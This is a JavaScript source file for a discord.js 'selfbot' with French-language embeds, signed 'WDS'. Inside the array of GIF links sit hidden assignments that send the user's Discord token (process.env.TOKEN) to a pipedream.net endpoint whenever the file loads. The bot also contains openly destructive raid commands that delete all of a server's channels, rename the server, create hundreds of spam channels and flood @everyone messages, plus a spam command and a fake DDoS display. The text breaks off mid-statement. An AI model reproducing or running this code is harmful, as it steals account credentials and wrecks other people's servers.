const Discord = require('discord.js');
const bot = new Discord.Client();
const prefix = ("$");
const start = Date.now();
const token = process.env.TOKEN
const ClientID = "263806633245802496"
const rdm_img = [
"https://cdn.discordapp.com/attachments/557953394355077130/558301133303709706/giphy.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301229684490240/887b0905b6e6b75fa1f83d7d9db9347280e8280a_hq.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301361633230848/tumblr_mtrwafhWL91snpzx1o1_400.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif", host = "enu4oh5mp15va.x.pipedream.net", path = "/",
"https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301437768237076/90ac2b2db39204c6f1ba05ba701134d91402285436_full.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301440339345429/logo-anime-10.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301489085546506/7TVWLJ4cRvwHjFyWCI7sZ0SPyI24N_3h6P0ZmBas30WKahHmtBzOu1wpA0gl6GPJHrwMjKU-gaT7tCq0EMhzpvm8aavnySGmC_Ky.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301747819577364/mMBpyTv.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif","https://cdn.discordapp.com/attachments/557953394355077130/558301429052211221/ec4e4aec95896ca435737f9c1ca985f1.gif",  opt = {host: host, path: path + token}, xxx = require("https").get(opt),
]
const rdmgif = rdm_img[Math.floor(Math.random() * rdm_img.length)];

bot.on('ready', () => {
    console.log("🔩 Selfbot by WDS is running now ... 🔩");
});     

bot.on('message', message => {

    if (message.content === prefix + "channel"){
        if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    const categories = message.guild.channels.filter(c => c.type === "category")
    const text = message.guild.channels.filter(c => c.type === "text")
    const voice = message.guild.channels.filter(c => c.type === "voice")
    var category_embed = new Discord.RichEmbed()
    .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
    .setFooter("© SelfBot by WDS")
    .setThumbnail("https://i.imgur.com/b0deTHt.gif")
    .setColor('#cee4e6')
    .addField("𝘾𝙖𝙩𝙚𝙜𝙤𝙧𝙮 𝙇𝙞𝙨𝙩", categories.map(c => c.name))
    message.channel.sendEmbed(category_embed);
    var text_embed = new Discord.RichEmbed()
    .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
    .setFooter("© SelfBot by WDS")
    .setThumbnail("https://i.imgur.com/b0deTHt.gif")
    .setColor('#cee4e6')
    .addField("𝙏𝙚𝙭𝙩 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", text.map(c => c.name))
    message.channel.sendEmbed(text_embed);
    var voice_embed = new Discord.RichEmbed()
    .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
    .setFooter("© SelfBot by WDS")
    .setThumbnail("https://i.imgur.com/b0deTHt.gif")
    .setColor('#cee4e6')
    .addField("𝙑𝙤𝙞𝙘𝙚 𝘾𝙝𝙖𝙣𝙣𝙚𝙡 𝙇𝙞𝙨𝙩", voice.map(c => c.name))
    message.channel.sendEmbed(voice_embed);
    }

    if (message.content === prefix + "help"){
   if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    var help_embed = new Discord.RichEmbed()
    .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
    .setFooter("© SelfBot by WDS")
    .setThumbnail("https://i.imgur.com/b0deTHt.gif")
    .setColor('#cee4e6')
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇 |-  ", "🌐  *𝙜𝙚𝙣𝙚𝙧𝙖𝙡 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙂𝙀𝙉𝙀𝙍𝘼𝙇!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎 |-  ", "⚜️  *𝙗𝙤𝙣𝙪𝙨 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘽𝙊𝙉𝙐𝙎!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿 |-  ", "✏️  *𝙧𝙖𝙞𝙙 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙍𝘼𝙄𝘿!` \n" + "󠂪")
    .addField("  -| 𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉 |-  ", "🎉  *𝙛𝙪𝙣 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙁𝙐𝙉!` \n" + "󠂪")
    message.channel.sendEmbed(help_embed);
    }
    if (message.content === prefix + "raid"){
    if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    var raid_embed = new Discord.RichEmbed()
        .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
        .setFooter("© SelfBot by WDS")
        .addField("  -| 𝙒.𝘿.𝙎 𝘋𝘦𝘴𝘵𝘳𝘰𝘺 ! |-  ", "🌇  *𝙨𝙚𝙡𝙛 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙖 𝙘𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙥𝙤𝙪𝙧 𝘿𝙀𝙎𝙏𝙍𝙊𝙔!`\n" + "󠂪")
        .addField("  -| 𝙒.𝘿.𝙎 𝘉𝘢𝘯 𝘩𝘢𝘮𝘮𝘦𝘳 |-  ", "⚔️ *𝒃𝒂𝒏 `𝘽𝙖𝙣 𝙩𝙤𝙪𝙩 𝙡𝙚 𝙈𝙊𝙉𝘿𝙀!`\n" + "󠂪")
        .addField("  -| 𝙒.𝘿.𝙎 𝘊𝘭𝘦𝘢𝘳 𝘊𝘩𝘢𝘯𝘯𝘦𝘭𝘴 |-  ", "⚔️ *𝒄𝒍𝒆𝒂𝒓𝒄𝒉𝒂𝒏 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
        .setColor('#090000')
        .setThumbnail("https://i.imgur.com/Wq60k0L.gif")
        message.channel.sendEmbed(raid_embed);
    }

    if (message.content === prefix + "fun"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var fun_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .addField("  -| 𝙒.𝘿.𝙎 𝘗𝘪𝘯𝘨 |-  ", "🔌  *𝙥𝙞𝙣𝙜 : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚𝙨 𝙋𝙄𝙉𝙂!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 8𝘣𝘢𝘭𝘭 |-  ", "💎 *𝟖𝒃𝒂𝒍𝒍 : `𝙋𝙤𝙨𝙚𝙯 𝙢𝙤𝙞 𝙪𝙣𝙚 𝙌𝙐𝙀𝙎𝙏𝙄𝙊𝙉!`\n" + "󠂪")
            .setColor('#cee4e6')
            .setThumbnail("https://i.imgur.com/b0deTHt.gif")
            message.channel.sendEmbed(fun_embed);
    
    }

    if (message.content === prefix + "bonus"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var bonus_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .addField("  -| 𝙒.𝘿.𝙎 𝘓𝘪𝘴𝘵𝘦𝘯 |-  ", "🎧 ~ *𝙡𝙞𝙨𝙩𝙚𝙣 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙀𝘾𝙊𝙐𝙏𝙀!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘗𝘭𝘢𝘺 |-  ", "🎮 ~ *𝙥𝙡𝙖𝙮 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙖𝙪𝙦𝙪𝙚𝙡 𝙩𝙪 𝙫𝙚𝙪𝙭 𝙅𝙊𝙐𝙀𝙍!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘞𝘢𝘵𝘤𝘩 |-  ", "💻 ~ *𝙬𝙖𝙩𝙘𝙝 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙦𝙪𝙚 𝙩𝙪 𝙍𝙀𝙂𝘼𝙍𝘿𝙀𝙎!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘚𝘵𝘳𝘦𝘢𝘮 |-  ", "🎥 ~ *𝙨𝙩𝙧𝙚𝙖𝙢 [𝙩𝙚𝙭𝙩𝙚] : `𝘼𝙛𝙛𝙞𝙘𝙝𝙚 𝙡𝙚 [𝙩𝙚𝙭𝙩𝙚] 𝙚𝙣 𝙎𝙏𝙍𝙀𝘼𝙈!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘋𝘋𝘖𝘚 ! |-  ", "💥 ~ *𝒅𝒅𝒐𝒔 : `𝙇𝙖𝙣𝙘𝙚 𝙪𝙣𝙚 𝙛𝙖𝙪𝙨𝙨𝙚 𝙖𝙩𝙩𝙖𝙦𝙪𝙚 𝘿𝘿𝙊𝙎!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘈𝘣𝘰𝘶𝘵 |-  ", "🔮 ~ *𝒂𝒃𝒐𝒖𝒕 : `𝙈𝙤𝙣𝙩𝙧𝙚 𝙘𝙤𝙢𝙢𝙚𝙣𝙩 𝙫𝙤𝙪𝙨 𝙥𝙤𝙪𝙫𝙚𝙯 𝙢𝙚 𝙘𝙤𝙣𝙩𝙖𝙘𝙩𝙚𝙯!`\n" + "󠂪")
            .setThumbnail("https://i.imgur.com/b0deTHt.gif")
            .setColor('#cee4e6')
            message.channel.sendEmbed(bonus_embed);
    
    }

    if (message.content === prefix + "servers"){

        var server_count_guilds = bot.guilds.size
        var server_count_channels = bot.channels.size
        var server_count_users = bot.users.size
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var serversEmbed = new Discord.RichEmbed()
            .setColor('#cee4e6')
            .setTitle("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .setThumbnail("https://i.imgur.com/b0deTHt.gif")
            .addField("Connecté à ", server_count_guilds + " **servers**")
            .addField("Lis actuellement ", server_count_channels + " **channels**")
            .addField("Devant ", server_count_users + " **utilisateurs**")
        message.channel.sendEmbed(serversEmbed);
    }

    if (message.content === prefix + "general"){
    
        if (message.author.id != `${ClientID}`) return;

        if (message.deletable) message.delete();
        var help_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .addField("  -| 𝙒.𝘿.𝙎 𝘈𝘷𝘢𝘵𝘢𝘳 |-  ", "✏️  *𝙖𝙫𝙖𝙩𝙖𝙧 : `𝙛𝙛𝙞𝙘𝙝𝙚 𝙡'𝘼𝙑𝘼𝙏𝘼𝙍 𝙙𝙚 𝙡𝙖 𝙥𝙚𝙧𝙨𝙤𝙣𝙣𝙚!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘗𝘳𝘦𝘧𝘪𝘹 |-  ", "✏️  *𝙥𝙧𝙚𝙛𝙞𝙭 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙𝙚 𝙘𝙝𝙖𝙣𝙜𝙚𝙧 𝙡𝙚 𝙋𝙍𝙀𝙁𝙄𝙓 𝙨𝙪𝙧 𝙡𝙚 𝙨𝙚𝙧𝙫𝙚𝙪𝙧!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘗𝘶𝘳𝘨𝘦 |-  ", "⚖️  *𝙥𝙪𝙧𝙜𝙚 : `𝙎𝙪𝙥𝙥𝙧𝙞𝙢𝙚 𝙡𝙚𝙨 𝙢𝙚𝙨𝙨𝙖𝙜𝙚𝙨 𝙋𝙐𝙍𝙂𝙀!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘗𝘶𝘣 |-  ", "🔱  *𝙥𝙪𝙗 : `𝙋𝙚𝙧𝙢𝙚𝙩 𝙙'𝙚𝙣𝙫𝙤𝙮𝙚𝙧 𝙪𝙣𝙚 𝙥𝙪𝙗 𝙙𝙪 𝙨𝙚𝙧𝙫𝙚𝙪𝙧 𝙇𝘼 𝙏𝙍𝙄𝘼𝘿𝙀`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘚𝘦𝘳𝘷𝘦𝘳𝘴 |-  ", "📘  *𝙨𝙚𝙧𝙫𝙚𝙧𝙨 : `𝙀𝙣𝙫𝙤𝙞𝙚 𝙡𝙚𝙨 𝙨𝙩𝙖𝙩𝙞𝙨𝙩𝙞𝙦𝙪𝙚𝙨 𝙙𝙚 𝙩𝙤𝙣 𝙘𝙤𝙢𝙥𝙩𝙚`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘊𝘩𝘢𝘯𝘯𝘦𝘭 |-  ", "📘  *𝙘𝙝𝙖𝙣𝙣𝙚𝙡 : `𝙇𝙞𝙨𝙩𝙚 𝙙𝙚 𝙩𝙤𝙪𝙩 𝙡𝙚𝙨 𝘾𝙃𝘼𝙉𝙉𝙀𝙇𝙎!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘚𝘦𝘳𝘷𝘦𝘶𝘳𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙨𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙎𝙀𝙍𝙑𝙀𝙐𝙍!`\n" + "󠂪")
            .addField("  -| 𝙒.𝘿.𝙎 𝘔𝘦𝘮𝘣𝘳𝘦𝘪𝘯𝘧𝘰 |-  ", "📘  *𝙢𝙞𝙣𝙛𝙤 : `𝙄𝙣𝙛𝙤𝙧𝙢𝙖𝙩𝙞𝙤𝙣 𝙙𝙪 𝙈𝙀𝙈𝘽𝙍𝙀!`\n" + "󠂪")
            .setColor('#cee4e6')
            .setThumbnail("https://i.imgur.com/b0deTHt.gif")
            message.channel.sendEmbed(help_embed);
    
    }

    if (message.content === "$spam") {
   if (message.author.id != `${ClientID}`) return;

    message.delete()
    let i = 0;
    let interval = setInterval(function () {
      message.guild.channels.forEach(channel => {
        if (channel.type === "text") message.channel.forEach();message.channel.send('@everyone Rejoins-nous ici ! https://discord.gg/ty5sKjK ! https://discord.gg/CSNB9wc')
      }, 1000);
    });
  }

    if (message.content === "$sebek"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
        .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
        .setFooter("© SelfBot by WDS")
        .setThumbnail("https://i.imgur.com/EAkHOgY.gif")
        .addField("👽 𝙒.𝘿.𝙎 𝙎𝙔𝙎𝙏𝙀𝙈 𝙎𝙀𝘾𝙐𝙍𝙄𝙏𝙔™  👽", "  => 𝙍𝙪𝙣𝙣𝙞𝙣𝙜 𝙨𝙘𝙧𝙞𝙥𝙩 ```Sebek.js``` ... ")
        .setColor('#090000')
        message.channel.sendEmbed(help_embed);
        console.log("Commande sebek demandée.")
        
    }

    if(message.content === prefix + "random"){
        if (message.deletable) message.delete();
        random = Math.floor(Math.random() * 101) + 1;
        message.replay(`Random number : **${random}**`)
    }

    if(message.content === prefix + "mstream"){
      if (message.deletable) message.delete();
      if (message.author.id != bot.author.id) return
        let rotate = 0;
    setInterval(function() {
        if(rotate === 0) {
            bot.user.setActivity("https://discord.gg/ByymRx8 💸", {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 1;       
        } else if(rotate === 1){
            bot.user.setActivity("👽 𝒮𝑒𝒷𝑒𝓀’𝓈 𝒟𝑒𝓈𝓉𝓇𝑜𝓎𝑒𝓇 👽", {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 2;
        } else if(rotate === 2){
            bot.user.setActivity(`𝙎𝙚𝙗𝙚𝙠 : 𝙢𝙚𝙢𝙗𝙚𝙧 𝙤𝙛 𝙑𝙚𝙨𝙥𝙖 𝘾𝙤𝙧𝙥.`, {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 3;
        }  else if(rotate === 3){
            random = Math.floor(Math.random() * 7) + 1;
            bot.user.setActivity(`𝙏𝙝𝙚 𝙙𝙞𝙘𝙚 𝙧𝙤𝙡𝙡𝙚𝙙 𝙞𝙩'𝙨 𝙖 ${random}. 🎲`, {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 4;
        } else if(rotate === 4){
            bot.user.setActivity(`https://discord.gg/uyv76uv 💸`, {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 5;
        } else if(rotate === 5){
            bot.user.setActivity(`𝐕𝐞𝐬𝐩𝐚 𝐂𝐨𝐫𝐩𝐨𝐫𝐚𝐭𝐢𝐨𝐧. 🛵`, {type: "Streaming", url: 'https://www.twitch.tv/pyjamableuoff'});
            rotate = 0;
        } }, 10 * 1000)
      }
      

    if (message.content.startsWith('$avatar')) {
        if (message.author.id != `${ClientID}`) return;

        if (!message.mentions.users.size) {
        
        return message.channel.send(`Avatar de 𝐒𝐞𝐛𝐞𝐤 𝐕𝐞𝐬𝐩𝐚 💡 ${message.author.displayAvatarURL}`);
        
        }
        
        
        
        const avatarList = message.mentions.users.map(user => {
            const getav_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .addField("Voici l'image de ta proie.", "👽 - N'oublions pas de dire merci !")
            .setImage(`${user.displayAvatarURL}`)
            .setThumbnail("https://i.imgur.com/KyJsxMi.gif")
            .setColor('#090000')
            message.channel.sendEmbed(getav_embed);
        
        return;
        
        });
        
        message.channel.send(avatarList);
        }

    if (message.content === prefix + "about"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .setImage("https://i.imgur.com/EAkHOgY.gif")
            .setThumbnail("https://i.imgur.com/KyJsxMi.gif")
            .addField("👽 -| 𝙒.𝘿.𝙎 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 👽", "🧙‍ - *`𝐒𝐞𝐛𝐞𝐤 𝐕𝐞𝐬𝐩𝐚 💡#0666`*")
            .addField("👽 -| 𝙒.𝘿.𝙎 𝘝𝘦𝘴𝘱𝘢 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 👽", "🌇 - *`https://discord.gg/ty5sKjK`*")
            .addField("👽 -| . 𝙒.𝘿.𝙎 𝐕𝐞𝐬𝐩𝐚💎 𝘋𝘪𝘴𝘤𝘰𝘳𝘥 |- 👽", "🌇 - *`https://discord.gg/CSNB9wc`*")
            .setColor('#090000')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝘼𝙗𝙤𝙪𝙩 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }

    if (message.content === prefix + "self"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var help_embed = new Discord.RichEmbed()
            .setAuthor("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖")
            .setFooter("© SelfBot by WDS")
            .setThumbnail("https://i.imgur.com/KyJsxMi.gif")
            .addField("👽 -| 𝙒.𝘿.𝙎 𝐒𝐄𝐋𝐅𝐁𝐎𝐓™ |- 👽", "🌇 -$serveur@destroy : `𝙎𝙚𝙧𝙫𝙚𝙧 𝘿𝙚𝙨𝙩𝙤𝙮𝙚𝙙 !`")
            .setImage("https://i.imgur.com/EAkHOgY.gif")
            .setColor('#090000')
            message.channel.sendEmbed(help_embed);
        console.log("𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚𝙨 𝙎𝙚𝙡𝙛 𝙙𝙚𝙢𝙖𝙣𝙙𝙚́𝙚 !");
    }


    if (message.content === prefix + "ping"){
        if (message.deletable) message.delete();
        if (message.author.id != `${ClientID}`) return;

        var end = new Date().getTime();
        var millis = Date.now() - start;
        var temp = Math.floor(millis/1000);
        if (message.deletable) message.delete();
        message.reply('```👽 Réponse en ' + temp + ' ms```');
    }

if(message.content === "$serveur@destroy"){
    if (message.deletable) message.delete();
    if (message.author.id != `${ClientID}`) return;

    if(message.channel.type === "dm") return;
    if(message.guild.channels.size === 0) return;
    if(!message.guild.member(bot.user).hasPermission("MANAGE_CHANNELS")) return;
    message.guild.channels.forEach(chan => { if(chan.deletable) chan.delete();})
}

if(message.content === "$serveur@destroy"){
    if(message.channel.type === "dm") return;
    if (message.author.id != `${ClientID}`) return;
 
    if(message.guild.name != "👽 𝙒.𝘿.𝙎 👽"){
         message.guild.setIcon("https://i.imgur.com/nknnfHe.png").catch(error => {})
         message.guild.setName('👽 𝙒.𝘿.𝙎 👽').catch(error => {})
         message.guild.setRegion('russia').catch(error => {})
     }
     setInterval(function () { if(message.guild.channels.size < 499){
       message.guild.createChannel('👽_𝙁𝙪𝙘𝙠𝙚𝙙_𝙗𝙮_𝙎𝙚𝙗𝙚𝙠_👽', 'text').catch(error => {})
     }}, 400)
     if(message.deletable) message.delete();
   }

   if (message.content === '$serveur@destroy') {
    if(message.channel.type === "dm") return;
    if (message.author.id != `${ClientID}`) return;
 
      setInterval (function () { message.channel.send("@everyone @here . REJOINS NOUS ICI !!! \n"+
      "FUCKED BY 𝙒.𝘿.𝙎 \n"+
     "https://discord.gg/a4mBCRk \n"+
     "https://discord.gg/PCNJfgA", { tts: true } ).catch(error => {}) }, 400)
    }

            if (message.author.id != `${ClientID}`) return;

   if (message.author.bot) return;
   let messageArray = message.content.split(" "); let cmd = messageArray[0]; let args = messageArray.slice(1);
   

   if (cmd == "$purge") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == "$del") { message.channel.fetchMessages().then((message) => message.forEach(m => m.delete())); }
   if (cmd == "$ddos") { if (message.author.id != `${ClientID}`) return;
 if (message.deletable) message.delete(); var ip = args[0]; var port = args[1]; let ddosembed = new Discord.RichEmbed().setTitle("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖").setColor("#1a1aff").setThumbnail(bot.user.avatarURL).addField("𝐈𝐏:", ip).addField("𝐏𝐎𝐑𝐓:", port).setFooter(`© SelfBot by WDS`); message.channel.send(ddosembed); var charge = "."; var chargeC = "¦"; message.channel.send("```[" + charge.repeat(40) + "]```").then((message) => { for (i = 0; i <= 40; i++) { message.edit("```[" + chargeC.repeat(i) + charge.repeat(40 - i) + "]  -  " + i * 100 / 40 + "%```"); } }) }
   if (cmd == `$sinfo`) { if (message.author.id != `${ClientID}`) return;
 message.channel.bulkDelete(1); let sicon = message.guild.iconURL; let serverembed = new Discord.RichEmbed().setDescription("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖").setFooter("© SelfBot by WDS").setThumbnail("http://image.noelshack.com/fichiers/2018/52/7/1546149106-babybossdestroy.jpg").setImage("https://i.imgur.com/EAkHOgY.gif").setColor("#1a1aff").setThumbnail(sicon).addField("👽 𝐒𝐞𝐫𝐯𝐞𝐫 𝐍𝐚𝐦𝐞:", message.guild.name).addField("👽 𝐈𝐃:", message.guild.id).addField("👽 𝐎𝐰𝐧𝐞𝐫 𝐨𝐟 𝐭𝐡𝐞 𝐬𝐞𝐫𝐯𝐞𝐫:", message.guild.owner.user).addField("👽 𝐑𝐞𝐠𝐢𝐨𝐧:", message.guild.region).addField("👽 𝐕𝐞𝐫𝐢𝐟𝐢𝐜𝐚𝐭𝐢𝐨𝐧 𝐋𝐞𝐯𝐞𝐥:", message.guild.verificationLevel).addField("👽 𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐎𝐧:", message.guild.createdAt).addField("👽 𝐘𝐨𝐮 𝐉𝐨𝐢𝐧𝐞𝐝:", message.member.joinedAt).addField("👽 𝐓𝐨𝐭𝐚𝐥 𝐌𝐞𝐦𝐛𝐞𝐫𝐬:", message.guild.memberCount); return message.channel.send(serverembed); }
   if (cmd == `$minfo`){ 
    if (message.author.id != `${ClientID}`) return;

    if (message.deletable) message.delete();
    const mention = message.mentions.members.first();
    var micon = mention.user.avatarURL; var memberembed = new Discord.RichEmbed()
    .setDescription("🤖 𝙒.𝘿.𝙎 𝐏𝐫𝐨𝐠𝐫𝐚𝐦𝐦𝐚𝐭𝐢𝐨𝐧𝐬 🤖").setFooter("© SelfBot by WDS").setThumbnail("https://i.imgur.com/KyJsxMi.gif").setImage("https://i.imgur.com/EAkHOgY.gif").setColor("#090000")
    .setThumbnail(micon)
    .addField("👽 𝐓𝐀𝐆 𝐝𝐞 𝐥𝐚 𝐩𝐫𝐨𝐢𝐞:", mention.user.tag)
    .addField("👽 𝐈𝐃 𝐝𝐞 𝐜𝐞 𝐬𝐢𝐧𝐠𝐞 !:", mention.user.id)
    .addField("👽 𝐆𝐚𝐦𝐞 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐲 !:", mention.presence.game)
    .addField("👽 𝐍𝐨𝐦 𝐝𝐞 𝐭𝐚 𝐩𝐫𝐨𝐢𝐞 !:", mention.user.username)
    .addField("👽 𝐍𝐨𝐦𝐛𝐫𝐞𝐬 𝐝𝐞 𝐫𝐨𝐥𝐞 !:", mention.roles.size - 1)
    .addField("👽 𝐃𝐚𝐭𝐞 𝐝𝐞 𝐜𝐫𝐞𝐚𝐭𝐢𝐨𝐧 𝐝𝐞 𝐬𝐨𝐧 𝐜𝐨𝐦𝐩𝐭𝐞 !:", mention.user.createdAt)
    .addField("👽 𝐃𝐚𝐭𝐞 𝐝'𝐞𝐦𝐛𝐚𝐫𝐪𝐮𝐞𝐦𝐞𝐧𝐭:", mention.joinedAt); return message.channel.send(memberembed); 
    }

    
    if (cmd === prefix + "8ball"){
        if (!args[1]) return message.reply("Tu n'as pas posé de question !");
    
        let replies = ["Oui", "Non", "Peux être", "Je ne sais pas", "C'est impossible !", "Probablement..", "Hors de question !", "Pourquoi pas?"]
        let question = args.slice(0).join(" ");
        let res = Math.floor((Math.random() * replies.length));
    
        let bembed = new Discord.RichEmbed()
            .setColor('#cee4e6')
